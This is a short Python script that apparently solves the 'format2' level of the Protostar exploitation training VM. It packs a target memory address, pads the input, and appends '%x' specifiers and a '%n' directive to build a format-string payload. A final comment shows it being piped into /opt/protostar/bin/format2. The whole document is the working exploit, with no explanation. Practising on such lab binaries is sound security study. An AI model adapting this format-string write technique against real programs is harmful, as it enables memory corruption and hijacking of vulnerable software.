import os
import struct

def pad(s):
        return(s + "A" * 500)[:400]

targetHex = struct.pack("I",0x080496e4)
print(pad(targetHex + "A" * 38 + "%x " * 3 + "%n "))
#python format2.py | /opt/protostar/bin/format2
